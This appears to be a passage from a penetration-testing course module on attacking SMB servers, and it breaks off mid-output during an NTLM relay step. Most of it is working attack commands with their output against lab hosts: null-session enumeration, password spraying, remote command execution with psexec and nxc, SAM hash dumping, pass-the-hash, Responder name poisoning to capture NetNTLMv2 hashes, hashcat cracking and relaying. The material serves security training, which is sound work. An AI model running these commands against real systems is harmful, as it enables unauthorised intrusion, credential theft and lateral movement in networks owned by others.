    "content": "\n---\n\nServer Message Block (SMB) is a communication protocol created for providing shared access to files and printers across nodes on a network. Initially, it was designed to run on top of NetBIOS over TCP/IP (NBT) using TCP port `139` and UDP ports `137` and `138`. However, with Windows 2000, Microsoft added the option to run SMB directly over TCP/IP on port `445` without the extra NetBIOS layer. Nowadays, modern Windows operating systems use SMB over TCP but still support the NetBIOS implementation as a failover.\n\nSamba is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Linux/Unix servers and Windows clients to use the same SMB services.\n\nFor instance, on Windows, SMB can run directly over port 445 TCP/IP without the need for NetBIOS over TCP/IP, but if Windows has NetBIOS enabled, or we are targetting a non-Windows host, we will find SMB running on port 139 TCP/IP. This means that SMB is running with NetBIOS over TCP/IP.\n\nAnother protocol that is commonly related to SMB is [MSRPC (Microsoft Remote Procedure Call)](https://en.wikipedia.org/wiki/Microsoft_RPC). RPC provides an application developer a generic way to execute a procedure (a.k.a. a function) in a local or remote process without having to understand the network protocols used to support the communication, as specified in [MS-RPCE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15), which defines an RPC over SMB Protocol that can use SMB Protocol named pipes as its underlying transport.\n\nTo attack an SMB Server, we need to understand its implementation, operating system, and which tools we can use to abuse it. As with other services, we can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities. Furthermore, after we gain access to the SMB Service, if we interact with a shared folder, we need to be aware of the content in the directory. Finally, if we are targetting NetBIOS or RPC, identify which information we can get or what action we can perform on the target.\n\n---\n\n## Enumeration\n\nDepending on the SMB implementation and the operating system, we will get different information using `Nmap`. Keep in mind that when targetting Windows OS, version information is usually not included as part of the Nmap scan results. Instead, Nmap will try to guess the OS version. However, we will often need other scans to identify if the target is vulnerable to a particular exploit. We will cover searching for known vulnerabilities later in this section. For now, let's scan ports 139 and 445 TCP.\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00024s latency).\n\nPORT    STATE SERVICE     VERSION\n139/tcp open  netbios-ssn Samba smbd 4.6.2\n445/tcp open  netbios-ssn Samba smbd 4.6.2\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nHost script results:\n|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-09-19T13:16:04\n|_  start_date: N/A\n```\n\nThe Nmap scan reveals essential information about the target:\n\n- SMB version (Samba smbd 4.6.2)\n- Hostname HTB\n- Operating System is Linux based on SMB implementation\n\nLet's explore some common misconfigurations and protocols specifics attacks.\n\n---\n\n## Misconfigurations\n\nSMB can be configured not to require authentication, which is often called a `null session`. Instead, we can log in to a system with no username or password.\n\n#### Anonymous Authentication\n\nIf we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc. Most tools that interact with SMB allow null session connectivity, including `smbclient`, `smbmap`, `rpcclient`, or `enum4linux`. Let's explore how we can interact with file shares and RPC using null authentication.\n\n#### File Share\n\nUsing `smbclient`, we can display a list of the server's shares with the option `-L`, and using the option `-N`, we tell `smbclient` to use the null session.\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ smbclient -N -L //10.129.14.128\n\n        Sharename       Type      Comment\n        -------      --     -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        notes           Disk      CheckIT\n        IPC$            IPC       IPC Service (DEVSM)\nSMB1 disabled no workgroup available\n```\n\n`Smbmap` is another tool that helps us enumerate network shares and access associated permissions. An advantage of `smbmap` is that it provides a list of permissions for each shared folder.\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ smbmap -H 10.129.14.128\n\n[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   \n        Disk                                                    Permissions     Comment\n        --                                                   ---------    -------\n        ADMIN$                                                  NO ACCESS       Remote Admin\n        C$                                                      NO ACCESS       Default share\n        IPC$                                                    READ ONLY       IPC Service (DEVSM)\n        notes                                                   READ, WRITE     CheckIT\n```\n\nUsing `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories:\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ smbmap -H 10.129.14.128 -r notes\n\n[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           \n        Disk                                                    Permissions     Comment\n        --                                                   ---------    -------\n        notes                                                   READ, WRITE\n        .\\notes\\*\n        dr--r--r               0 Mon Nov  2 00:57:44 2020    .\n        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..\n        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG\n        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt\n        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp\n        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ\n        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO\n        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup\n```\n\nFrom the above example, the permissions are set to `READ` and `WRITE`, which one can use to upload and download the files.\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ smbmap -H 10.129.14.128 --download \"notes\\note.txt\"\n\n[+] Starting download: notes\\note.txt (116 bytes)\n[+] File output to: /htb/10.129.14.128-notes_note.txt\n```\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt \"notes\\test.txt\"\n\n[+] Starting upload: test.txt (20 bytes)\n[+] Upload complete.\n```\n\n#### Remote Procedure Call (RPC)\n\nWe can use the `rpcclient` tool with a null session to enumerate a workstation or Domain Controller.\n\nThe `rpcclient` tool offers us many different commands to execute specific functions on the SMB server to gather information or modify server attributes like a username. We can use this [cheat sheet from the SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) or review the complete list of all these functions found on the [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) of the `rpcclient`.\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ rpcclient -U'%' 10.10.110.17\n\nrpcclient $> enumdomusers\n\nuser:[mhope] rid:[0x641]\nuser:[svc-ata] rid:[0xa2b]\nuser:[svc-bexec] rid:[0xa2c]\nuser:[roleary] rid:[0xa36]\nuser:[smorgan] rid:[0xa37]\n```\n\n`Enum4linux` is another utility that supports null sessions, and it utilizes `nmblookup`, `net`, `rpcclient`, and `smbclient` to automate some common enumeration from SMB targets such as:\n\n- Workgroup/Domain name\n- Users information\n- Operating system information\n- Groups information\n- Shares Folders\n- Password policy information\n\nThe [original tool](https://github.com/CiscoCXSecurity/enum4linux) was written in Perl and [rewritten by Mark Lowe in Python](https://github.com/cddmp/enum4linux-ng).\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C\n\nENUM4LINUX - next generation\n\n ==========================\n|    Target Information    |\n ==========================\n[*] Target ........... 10.10.11.45\n[*] Username ......... ''\n[*] Random Username .. 'noyyglci'\n[*] Password ......... ''\n\n ====================================\n|    Service Scan on 10.10.11.45     |\n ====================================\n[*] Checking LDAP (timeout: 5s)\n[-] Could not connect to LDAP on 389/tcp: connection refused\n[*] Checking LDAPS (timeout: 5s)\n[-] Could not connect to LDAPS on 636/tcp: connection refused\n[*] Checking SMB (timeout: 5s)\n[*] SMB is accessible on 445/tcp\n[*] Checking SMB over NetBIOS (timeout: 5s)\n[*] SMB over NetBIOS is accessible on 139/tcp\n\n ===================================================                            \n|    NetBIOS Names and Workgroup for 10.10.11.45    |\n ===================================================                                                                                         \n[*] Got domain/workgroup name: WORKGROUP\n[*] Full NetBIOS names information:\n- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service\n- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service\n- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service\n- MAC Address = 00-0C-29-D7-17-DB\n...\n ========================================\n|    SMB Dialect Check on 10.10.11.45    |\n ========================================\n\n<SNIP>\n```\n\n---\n\n## Protocol Specifics Attacks\n\nIf a null session is not enabled, we will need credentials to interact with the SMB protocol. Two common ways to obtain credentials are [brute forcing](https://en.wikipedia.org/wiki/Brute-force_attack) and [password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack).\n\n#### Brute Forcing and Password Spray\n\nWhen brute-forcing, we try as many passwords as possible against an account, but it can lock out an account if we hit the threshold. We can use brute-forcing and stop before reaching the threshold if we know it. Otherwise, we do not recommend using brute force.\n\nPassword spraying is a better alternative since we can target a list of usernames with one common password to avoid account lockouts. We can try more than one password if we know the account lockout threshold. Typically, two to three attempts are safe, provided we wait 30-60 minutes between attempts. Let's explore the tool [nxc](https://github.com/byt3bl33d3r/nxc) that includes the ability to execute password spraying.\n\nWith nxc (CME), we can target multiple IPs, using numerous users and passwords. Let's explore an everyday use case for password spraying. To perform a password spray against one IP, we can use the option `-u` to specify a file with a user list and `-p` to specify a password. This will attempt to authenticate every user from the list using the provided password.\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /tmp/userlist.txt\n\nAdministrator\njrodriguez \nadmin\n<SNIP>\njurena\n```\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ nxc smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth\n\nSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)\nSMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\Administrator:Company01! STATUS_LOGON_FAILURE \nSMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\jrodriguez:Company01! STATUS_LOGON_FAILURE \nSMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\admin:Company01! STATUS_LOGON_FAILURE \nSMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\eperez:Company01! STATUS_LOGON_FAILURE \nSMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\amone:Company01! STATUS_LOGON_FAILURE \nSMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\fsmith:Company01! STATUS_LOGON_FAILURE \nSMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\\tcrash:Company01! STATUS_LOGON_FAILURE \n\n<SNIP>\n\nSMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\\jurena:Company01! (Pwn3d!) \n```\n\n**Note:** By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list. Additionally, if we are targetting a non-domain joined computer, we will need to use the option `--local-auth`. For a more detailed study Password Spraying see the Active Directory Enumeration & Attacks module.\n\nFor more detailed usage instructions, check out the tool's [documentation guide](https://web.archive.org/web/20220129050920/https://mpgn.gitbook.io/nxc/getting-started/using-credentials).\n\n#### SMB\n\nLinux and Windows SMB servers provide different attack paths. Usually, we will only get access to the file system, abuse privileges, or exploit known vulnerabilities in a Linux environment, as we will discuss later in this section. However, in Windows, the attack surface is more significant.\n\nWhen attacking a Windows SMB Server, our actions will be limited by the privileges we had on the user we manage to compromise. If this user is an Administrator or has specific privileges, we will be able to perform operations such as:\n\n- Remote Command Execution\n- Extract Hashes from SAM Database\n- Enumerating Logged-on Users\n- Pass-the-Hash (PTH)\n\nLet's discuss how we can perform such operations. Additionally, we will learn how the SMB protocol can be abused to retrieve a user's hash as a method to escalate privileges or gain access to a network.\n\n#### Remote Code Execution (RCE)\n\nBefore jumping into how to execute a command on a remote system using SMB, let's talk about Sysinternals. The Windows Sysinternals website was created in 1996 by [Mark Russinovich](https://en.wikipedia.org/wiki/Mark_Russinovich) and [Bryce Cogswell](https://en-academic.com/dic.nsf/enwiki/2358707) to offers technical resources and utilities to manage, diagnose, troubleshoot, and monitor a Microsoft Windows environment. Microsoft acquired Windows Sysinternals and its assets on July 18, 2006.\n\nSysinternals featured several freeware tools to administer and monitor computers running Microsoft Windows. The software can now be found on the [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/). One of those freeware tools to administer remote systems is PsExec.\n\n[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a [named pipe](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) that can send commands to the system.\n\nWe can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or we can use some Linux implementations:\n\n- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).\n- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described [here](https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access). This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.\n- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.\n- [nxc](https://github.com/byt3bl33d3r/nxc) - includes an implementation of `smbexec` and `atexec`.\n- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.\n\n#### Impacket PsExec\n\nTo use `impacket-psexec`, we need to provide the domain/username, the password, and the IP address of our target machine. For more detailed information we can use impacket help:\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ impacket-psexec -h\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\nusage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address]\n                 [-target-ip ip address] [-port [destination port]] [-service-name service_name] [-remote-binary-name remote_binary_name]\n                 target [command ...]\n\nPSEXEC like functionality example using RemComSvc.\n\npositional arguments:\n  target                [[domain/]username[:password]@]<targetName or address>\n  command               command (or arguments if -c is used) to execute at the target (w/o path) - (default:cmd.exe)\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -c pathname           copy the filename for later execution, arguments are passed in the command option\n  -path PATH            path of the command to execute\n  -file FILE            alternative RemCom binary (be sure it doesn't require CRT)\n  -ts                   adds timestamp to every logging output\n  -debug                Turn DEBUG output ON\n\nauthentication:\n  -hashes LMHASH:NTHASH\n                        NTLM hashes, format is LMHASH:NTHASH\n  -no-pass              don't ask for password (useful for -k)\n  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the\n                        ones specified in the command line\n  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)\n  -keytab KEYTAB        Read keys for SPN from keytab file\n\nconnection:\n  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter\n  -target-ip ip address\n                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve\n                        it\n  -port [destination port]\n                        Destination port to connect to SMB Server\n  -service-name service_name\n                        The name of the service used to trigger the payload\n  -remote-binary-name remote_binary_name\n                        This will be the name of the executable uploaded on the target\n```\n\nTo connect to a remote machine with a local administrator account, using `impacket-psexec`, you can use the following command:\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Requesting shares on 10.10.110.17.....\n[*] Found writable share ADMIN$\n[*] Uploading file EHtJXgng.exe\n[*] Opening SVCManager on 10.10.110.17.....\n[*] Creating service nbAc on 10.10.110.17.....\n[*] Starting service nbAc.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.19041.1415]\n(c) Microsoft Corporation. All rights reserved.\n\n\nC:\\Windows\\system32>whoami && hostname\n\nnt authority\\system\nWIN7BOX\n```\n\nThe same options apply to `impacket-smbexec` and `impacket-atexec`.\n\n#### nxc\n\nAnother tool we can use to run CMD or PowerShell is `nxc`. One advantage of `nxc` is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, `smb`, the IP address or IP address range, the option `-u` for username, and `-p` for the password, and the option `-x` to run cmd commands or uppercase `-X` to run PowerShell commands.\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ nxc smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec\n\nSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)\nSMB         10.10.110.17 445    WIN7BOX  [+] .\\Administrator:Password123! (Pwn3d!)\nSMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec\nSMB         10.10.110.17 445    WIN7BOX  nt authority\\system\n```\n\n**Note:** If the`--exec-method` is not defined, nxc will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.\n\n#### Enumerating Logged-on Users\n\nImagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use `nxc` to enumerate logged-on users on all machines within the same network `10.10.110.17/24`, which speeds up our enumeration process.\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ nxc smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users\n\nSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)\nSMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\\administrator:Password123! (Pwn3d!)\nSMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users\nSMB         10.10.110.17 445    WIN7BOX  WIN7BOX\\Administrator             logon_server: WIN7BOX\nSMB         10.10.110.17 445    WIN7BOX  WIN7BOX\\jurena                    logon_server: WIN7BOX\nSMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)\nSMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\\Administrator:Password123! (Pwn3d!)\nSMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users\nSMB         10.10.110.21 445    WIN10BOX  WIN10BOX\\demouser                logon_server: WIN10BOX\n```\n\n#### Extract Hashes from SAM Database\n\nThe Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:\n\n- Authenticate as another user.\n- Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.\n- Pass The Hash. We will discuss it later in this section.\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ nxc smb 10.10.110.17 -u administrator -p 'Password123!' --sam\n\nSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)\nSMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\\administrator:Password123! (Pwn3d!)\nSMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes\nSMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::\nSMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nSMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nSMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::\nSMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::\nSMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::\nSMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database\n```\n\n#### Pass-the-Hash (PtH)\n\nIf we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH). PtH allows an attacker to authenticate to a remote server or service using the underlying NTLM hash of a user's password instead of the plaintext password. We can use a PtH attack with any `Impacket` tool, `SMBMap`, `nxc`, among other tools. Here is an example of how this would work with `nxc`:\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ nxc smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE\n\nSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)\nSMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)\n```\n\n#### Forced Authentication Attacks\n\nWe can also abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).\n\nThe most common tool to perform such operations is the `Responder`. [Responder](https://github.com/lgandx/Responder) is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.\n\nLet's illustrate an example to understand better how `Responder` works. Imagine we created a fake SMB server using the Responder default configuration, with the following command:\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ responder -I <interface name>\n```\n\nWhen a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:\n\n- The hostname file share's IP address is required.\n- The local host file (C:\\Windows\\System32\\Drivers\\etc\\hosts) will be checked for suitable records.\n- If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.\n- Is there no local DNS record? A query will be sent to the DNS server that has been configured.\n- If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.\n\nSuppose a user mistyped a shared folder's name `\\\\mysharefoder\\` instead of `\\\\mysharedfolder\\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo responder -I ens33\n\n                                         __               \n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|              \n\n           NBT-NS, LLMNR & MDNS Responder 3.0.6.0\n               \n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To kill this script hit CTRL-C\n\n[+] Poisoners:                \n    LLMNR                      [ON]\n    NBT-NS                     [ON]        \n    DNS/MDNS                   [ON]   \n                                                                                                                                                                                          \n[+] Servers:         \n    HTTP server                [ON]                                   \n    HTTPS server               [ON]\n    WPAD proxy                 [OFF]                                  \n    Auth proxy                 [OFF]\n    SMB server                 [ON]                                   \n    Kerberos server            [ON]                                   \n    SQL server                 [ON]                                   \n    FTP server                 [ON]                                   \n    IMAP server                [ON]                                   \n    POP3 server                [ON]                                   \n    SMTP server                [ON]                                   \n    DNS server                 [ON]                                   \n    LDAP server                [ON]\n    RDP server                 [ON]\n    DCE-RPC server             [ON]\n    WinRM server               [ON]                                   \n                                                                                   \n[+] HTTP Options:                                                                  \n    Always serving EXE         [OFF]                                               \n    Serving EXE                [OFF]                                               \n    Serving HTML               [OFF]                                               \n    Upstream Proxy             [OFF]                                               \n\n[+] Poisoning Options:                                                             \n    Analyze Mode               [OFF]                                               \n    Force WPAD auth            [OFF]                                               \n    Force Basic Auth           [OFF]                                               \n    Force LM downgrade         [OFF]                                               \n    Fingerprint hosts          [OFF]                                               \n\n[+] Generic Options:                                                               \n    Responder NIC              [tun0]                                              \n    Responder IP               [10.10.14.198]                                      \n    Challenge set              [random]                                            \n    Don't Respond To Names     ['ISATAP']                                          \n\n[+] Current Session Variables:                                                     \n    Responder Machine Name     [WIN-2TY1Z1CIGXH]   \n    Responder Domain Name      [HF2L.LOCAL]                                        \n    Responder DCE-RPC Port     [48162] \n\n[+] Listening for events... \n\n[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)\n[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)\n[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local\n[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder\n[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local\n[SMB] NTLMv2-SSP Client   : 10.10.110.17\n[SMB] NTLMv2-SSP Username : WIN7BOX\\demouser\n[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000\n```\n\nThese captured credentials can be cracked using [hashcat](https://hashcat.net/hashcat/) or relayed to a remote host to complete the authentication and impersonate the user.\n\nAll saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.\n\n**Note:** If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt\n\nhashcat (v6.1.1) starting...\n\n<SNIP>\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344386\n* Bytes.....: 139921355\n* Keyspace..: 14344386\n\nADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword\n                                                 \nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: NetNTLMv2\nHash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000\nTime.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)\nTime.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 75776/14344386 (0.53%)\nRejected.........: 0/75776 (0.00%)\nRestore.Point....: 73728/14344386 (0.51%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: compu -> kodiak1\n\nStarted: Mon Apr 11 16:49:34 2022\nStopped: Mon Apr 11 16:49:37 2022\n```\n\nThe NTLMv2 hash was cracked. The password is `P@ssword`. If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.\n\nFirst, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='\n\nSMB = Off\n```\n\nThen we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n<SNIP>\n\n[*] Running in relay mode to single host\n[*] Setting up SMB Server\n[*] Setting up WCF Server\n\n[*] 